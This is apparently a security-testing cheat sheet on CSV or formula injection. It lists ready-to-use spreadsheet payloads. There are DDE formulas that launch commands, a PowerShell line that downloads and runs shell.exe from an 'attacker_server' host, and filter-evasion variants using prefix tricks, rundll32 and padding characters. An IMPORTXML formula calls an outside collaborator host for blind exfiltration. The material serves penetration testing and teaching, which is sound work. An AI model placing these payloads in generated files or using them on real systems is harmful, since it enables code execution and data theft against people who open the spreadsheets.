# CSV Injection

> Many web applications allow the user to download content such as templates for invoices or user settings to a CSV file. Many users choose to open the CSV file in either Excel, Libre Office or Open Office. When a web application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells being executed.

## Methodology

CSV Injection, also known as Formula Injection, is a security vulnerability that occurs when untrusted input is included in a CSV file. Any formula can be started with:

```powershell
=
+
–
@
```

Basic exploits with **Dynamic Data Exchange**.

* Spawn a calc

    ```powershell
    DDE ("cmd";"/C calc";"!A0")A0
    @SUM(1+1)*cmd|' /C calc'!A0
    =2+5+cmd|' /C calc'!A0
    =cmd|' /C calc'!'A1'
    ```

* PowerShell download and execute

    ```powershell
    =cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
    ```

* Prefix obfuscation and command chaining

    ```powershell
    =AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
    =cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
    =         cmd|'/c calc.exe'!A
    ```

* Using rundll32 instead of cmd

    ```powershell
    =rundll32|'URL.dll,OpenURL calc.exe'!A
    =rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A
    ```

* Using null characters to bypass dictionary filters. Since they are not spaces, they are ignored when executed.

    ```powershell
    =    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
    ```

Technical details of the above payloads:

* `cmd` is the name the server can respond to whenever a client is trying to access the server
* `/C` calc is the file name which in our case is the calc(i.e the calc.exe)
* `!A0` is the item name that specifies unit of data that a server can respond when the client is requesting the data

### Google Sheets

Google Sheets allows some additional formulas that are able to fetch remote URLs:

* [IMPORTXML](https://support.google.com/docs/answer/3093342?hl=en)(url, xpath_query, locale)
* [IMPORTRANGE](https://support.google.com/docs/answer/3093340)(spreadsheet_url, range_string)
* [IMPORTHTML](https://support.google.com/docs/answer/3093339)(url, query, index)
* [IMPORTFEED](https://support.google.com/docs/answer/3093337)(url, [query], [headers], [num_items])
* [IMPORTDATA](https://support.google.com/docs/answer/3093335)(url)

So one can test blind formula injection or a potential for data exfiltration with:

```c
=IMPORTXML("http://burp.collaborator.net/csv", "//a/@href")
```

Note: an alert will warn the user a formula is trying to contact an external resource and ask for authorization.
